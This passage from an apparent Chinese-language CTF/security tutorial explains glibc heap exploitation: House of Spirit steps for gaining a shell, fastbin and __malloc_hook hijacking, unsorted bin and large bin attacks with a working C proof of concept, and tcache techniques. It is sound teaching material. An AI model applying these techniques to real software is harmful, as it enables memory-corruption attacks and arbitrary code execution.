<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400B1F                 call    get_num</span><br><span class="line">.text:0000000000400B24                 cdqe</span><br><span class="line">.text:0000000000400B26                 mov     [rbp+id], rax</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>sub_400A29</code> 函数：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> money[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me money~&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, money, <span class="number">64uLL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, money);</span><br><span class="line">  ptr = dest;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4009C4</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>money 存在缓存区溢出漏洞，可以修改 dest 指针指向 fake chunk 的内存区域，进而将 ptr 修改为该值。</li>
<li>money 本身可以构造 fake chunk 的头部</li>
</ul>
</li>
<li><p><code>sub_4009C4</code> 函数：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4009C4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      num = <span class="built_in">get_num</span>();</span><br><span class="line">      <span class="keyword">if</span> ( num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">alloc</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;good bye~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>delete</code> 函数可以释放 fake chunk ，触发 House Of Spirit 漏洞。</li>
<li><code>alloc</code> 函数可以申请释放的 fake chunk ，从而修改 <code>sub_400A29</code> 的返回地址 为 shellcode 地址。</li>
</ul>
</li>
</ul>
<p>利用过程：</p>
<ol>
<li>name 填入 shellcode ，利用 off-by-one 漏洞获取 rbp 。注意 shellcode 不能有 <code>\x00</code> 字节，否则会截断无法泄露 rbp 。</li>
<li>id 填入 fake chunk 下一个 chunk 的 size 值，填入 0x41 即可。</li>
<li>money 构造 fake 头部，并修改 dest 指向 fake chunk 内存区域</li>
<li>释放 ptr 指针指向的 fake chunk ，触发 House Of Spirit 漏洞。</li>
<li>申请到 fake chunk ，并将 <code>sub_400A29</code> 返回地址修改为 shellcode 地址（rbp-0x50）。<br>以上过程完成 fake chunk 构造和申请，此时栈结构如下图：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/9fa8fdababb35c36a06e85c603520a11.png"
                     
                ></li>
<li>退出执行 shellcode 获取 shell 。</li>
</ol>
<h2 id="Alloc-to-Stack-Arbitrary-Alloc"><a href="#Alloc-to-Stack-Arbitrary-Alloc" class="headerlink" title="Alloc to Stack &amp; Arbitrary Alloc"></a>Alloc to Stack &amp; Arbitrary Alloc</h2><p>劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的地址处，从而实现控制一些关键数据，比如返回地址等。</p>
<p>fd 指向的内存能申请出来的前提是该内存对应 size 处的值与该 fast bin 对应 size 相同。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line">        idx = fastbin_index(nb);</span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">                errout:</span><br><span class="line">                malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>由于这里的 size 不考虑低 3 比特，并且 libc 或栈地址多数是 0x7f 开头，因此可以通过截取 0x7f 然后用 0x70 的 fastbin 将该内存申请出来。<br>例如修改 fd 指针指向 <code>__realloc_hook</code> 前合适的偏移（通常是 <code>__malloc_hook</code> 往前 0x23 的偏移），两次 <code>malloc(0x60)</code> 申请出该地址的 fake chunk 实现对 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的控制。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/a9fa9baa971ea4a92068b2c1f1152188.png"
                     
                ><br>由于 one_gadget 可能因栈结构不满足条件而失效，可以通过修改 <code>__malloc_hook</code> 为 <code>realloc+偏移</code> ，修改 <code>__realloc_hook</code> 为 <code>one_gadget</code> 改变栈结构来获取 <code>shell</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/98c0f43d533b1ed67fb794ab76a6c6c9.png"
                     
                ></p>
<p>除了 realloc + 偏移外，还可以通过触发 malloc 报错执行 malloc 来改变栈结构。</p>
<h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><p>由于 unsorted bin 是双向链表，因此在 unsorted bin 链表中必有一个节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/7206f8e4b4483e5869a8033343497c8a.png"
                      alt="image-20220216135528044"
                ></p>
<p>而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，从而获取 libc 的基地址。</p>
<p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure></div>

<p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p>
<h2 id="Unsorted-Bin-Attack-1"><a href="#Unsorted-Bin-Attack-1" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h2><p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="built_in">unsorted_chunks</span> (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span> (av);</span><br></pre></td></tr></table></figure></div>

<p>换而言之，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。通常可以利用此方法向 <code>global_max_fast</code> 写入一个较大的值，从而扩大 fast bin 范围，甚至 <code>fastbinsY</code> 数组溢出 造成任意地址写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f8bb7fdeae34ead63a5ec4ea808a7aab.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ><br>unsorted bin attack 之后，fake chunk 被链入 unsorted bin 中，此时要想将 unsorted bin 申请出来必须通过如下检查：</p>
<ul>
<li><p>检查 size 是否合法</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">&gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>unsorted bin chunk 的 bk 字段指向的地址必须为可写</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></div>

<p>后续会介绍 House of Storm 利用手法，本质是在 unsorted bin attack 的基础上利用 large bin attack 进行两处任意地址写来伪造 fake chunk 的 size 和 bk ，从而将 fake chunk 申请出来。</p>
</li>
</ul>
<p>不过从 glibc-2.28 开始会有如下检查，此方法失效。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="Large-Bin-Attack-House-of-Fun"><a href="#Large-Bin-Attack-House-of-Fun" class="headerlink" title="Large Bin Attack (House of Fun)"></a>Large Bin Attack (House of Fun)</h1><p>Large Bin Attack 就是通过修改位于 large bin 的 chunk 的指针，然后让其它的 chunk 进入 large bin ，借助链表操作在目标地址处写入一个堆的地址。<br>large bin 可以利用的指针有 bk 和 bk_nextsize 。</p>
<h2 id="早期的-Large-Bin-Attack"><a href="#早期的-Large-Bin-Attack" class="headerlink" title="早期的 Large Bin Attack"></a>早期的 Large Bin Attack</h2><p>glibc-2.30 之前，由于 chunk 链入 large bin 的过程中缺乏对 bk 和 bk_nextsize 指针的检查，因此可以 通过修改 bk 和 bk_nextsize 指针进行两处任意地址写。</p>
<p>如果新加入的 chunk <strong>不小于 large bin 中的 chunk</strong> 会进行如下操作：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">       &#123;</span><br><span class="line">         ...</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         victim_index = largebin_index (size);</span><br><span class="line">         bck = bin_at (av, victim_index);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">   &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">               &#123;</span><br><span class="line">                 ...</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>劫持一个 large bin 中一个<strong>在同等大小 chunk 中 bk 方向最靠前的 chunk</strong> 的 <strong>bk</strong> 和 <strong>bk_nextsize</strong> 然后释放一个比该 chunk <strong>稍大一些</strong>的 chunk 就可以实现下图所示效果。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8ada377542ce2b6f3de0cf31202bef1d.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>自 glibc-2.30 开始如果加入的 chunk 不是最小的则在插入链表时会对 bk 指针进行检查。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="新版本的-Large-Bin-Attack"><a href="#新版本的-Large-Bin-Attack" class="headerlink" title="新版本的 Large Bin Attack"></a>新版本的 Large Bin Attack</h2><p>如果新加入的 chunk <strong>小于 large bin 中的 chunk</strong> 会进行如下操作：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">  &#123;</span><br><span class="line">   ...</span><br><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">      &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">   ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>如果通过让新加入 large bin 小于 large bin 最小的 chunk 来绕过检查需要伪造 bk 指向的 fake chunk 的 size 字段。并且这里的 bk 是 bins 上的 bk ，不容易劫持。所以一般不会考虑利用 bk 指针进行 large bin attack 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br></pre></td></tr></table></figure></div>

<p><strong>与 bk 不同的是 bk_nextsize 来自的是 fwd(unsorted bin)-&gt; fd 而不是 unsorted bin ，可以劫持。</strong> 因此如果将 large bin 中的<strong>最小</strong>的 chunk 的 <code>bk_nextsize</code> 指向 <code>&amp;target - 0x20</code> 的位置，然后加入一个<strong>更小</strong> chunk 就会将 target 写入新加入 chunk 的地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/dd2efd0fb9e0eb7cf2d69e9ea31f41ac.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
[poc](https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/large_bin_attack) 如下：

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  </span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>除了申请更大的 chunk 外，也可以通过申请较小的 chunk 来触发 large bin attack 。因为从 unsorted bin 中直接切割 chunk 的条件中 <code>victim == av-&gt;last_remainder</code> 没有满足（因为成为 last_remainder 的条件之一是大小在 small bin 范围内），最终 unsorted bin 中的 chunk 进入 large bin 中触发 large bin attack 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>

<p>之后，程序会在 large bin 中按 size 升序寻找合适 chunk 来切割出所需的内存。由于 large bin 通过 <code>first (bin)-&gt;bk_nextsize</code> 访问最小的 chunk ，因此最先查找到的是刚刚进入 large bin 的 chunk 并且该 chunk 大小满足条件。之后该 chunk 会从 large bin 中取出然后从中切下所需的内存并将剩余部分放入 unsorted bin 。因此最终写入 target 的值是最开始修改了 bk_nextsize 的 chunk 的地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">     <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">  &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">    &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         victim = victim-&gt;bk_nextsize;</span><br><span class="line">         <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                 (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line">         ...</span><br><span class="line">         unlink_chunk (av, victim);</span><br><span class="line">... <span class="comment">// 切割 chunk 并将 chunk 的剩余部分放入 unsorted bin</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/55abd925f9352c4942f40cd924a61c43.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >

<h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><p>tcache 类似 fast bin ，但是 next 指针指向的是下一个 chunk 的内存区域且检查比 fast bin 少。</p>
<h2 id="绕过-tcache"><a href="#绕过-tcache" class="headerlink" title="绕过 tcache"></a>绕过 tcache</h2><p>如果想让释放的 chunk 不进入 tcache 有如下方法：</p>
<ul>
<li>释放不在 tcache 大小范围的 chunk。</li>
<li>释放 7 个同样大小的 tcache 填满对应位置的 bin。</li>
<li>如果题目限制了 free 次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1 来绕过 tcache 。</li>
<li>控制 tcache_perthread_struct 从而控制 counts 实现绕过 tcache 。</li>
</ul>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<h2 id="House-of-Autm"><a href="#House-of-Autm" class="headerlink" title="House of Autm"></a>House of Autm</h2><p>这是一个关于 tcachebin 的技巧，用于修改 chunk presize&#x2F;size，利用过程如下：</p>
<ul>
<li>申请 chunk A，大小在 fastbin 范围内。</li>
<li>释放 A，连续释放 8 次，此时，A 的 fd 被清 0，A 也被放置到了 fastbin 里面。</li>
<li>申请一个 chunk，将其 fd 修改为 A - 0x10，此时 tcache 中的 counts 为 6 。</li>
<li>再申请一个 chunk，从 fastbin 里面取，但是会把 fastbin 里面剩余的一个 chunk 链入到 tcachebin 。</li>
<li>再次分配就会分配到地址 A-0x10 处，就可以修改原来 A 的 presize&#x2F;size 等。</li>
</ul>
<img  
